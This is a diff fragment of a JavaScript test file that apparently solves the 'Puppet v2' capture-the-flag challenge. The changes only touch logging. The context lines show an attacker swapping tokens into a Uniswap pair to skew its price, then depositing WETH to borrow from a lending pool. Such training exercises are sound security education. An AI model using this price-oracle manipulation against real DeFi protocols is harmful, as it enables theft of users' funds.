@@ -99,9 +99,9 @@ describe('[Challenge] Puppet v2', function () {
         pairTokenBalance = await this.token.balanceOf(this.uniswapExchange.address);
         console.log("weth Balance of the pair:", ethers.utils.formatEther(pairWethBalance));
         console.log("token Balance of the pair:", ethers.utils.formatEther(pairTokenBalance));
-        
+
         amountOut = await this.uniswapRouter.getAmountsOut(TokenToSwap, [this.weth.address, this.token.address]);
-        console.log("amount out if swapping " , ethers.utils.formatEther(TokenToSwap) , "DVT :", ethers.utils.formatEther(amountOut[1]));
+        console.log("amount out if swapping " , ethers.utils.formatEther(TokenToSwap) , "DVT :", ethers.utils.formatEther(amountOut[1]), "WETH");
 
         this.token.approve(this.uniswapRouter.address, TokenToSwap);
 
@@ -122,14 +122,14 @@ describe('[Challenge] Puppet v2', function () {
         console.log("token Balance of the pair:", ethers.utils.formatEther(pairTokenBalance));
 
         amountOut = await this.uniswapRouter.getAmountsOut(oneEth, [this.weth.address, this.token.address]);
-        console.log("amount out if swapping " , ethers.utils.formatEther(oneEth) , "DVT :", ethers.utils.formatEther(amountOut[1]));
+        console.log("amount out if swapping " , ethers.utils.formatEther(oneEth) , "DVT :", ethers.utils.formatEther(amountOut[1]), "WETH");
         
         wethToDeposit = await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1000000'));
         console.log("wethToDeposit:", ethers.utils.formatEther(wethToDeposit));
         console.log("attacker eth balance:", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
 
         await this.weth.connect(attacker).deposit({value: wethToDeposit});
-        console.log("attacker weth balance", await this.weth.balanceOf(attacker.address));
+        console.log("attacker weth balance", ethers.utils.formatEther(await this.weth.balanceOf(attacker.address)));
 
         await this.weth.connect(attacker).approve(this.lendingPool.address, wethToDeposit);
         await this.lendingPool.connect(attacker)
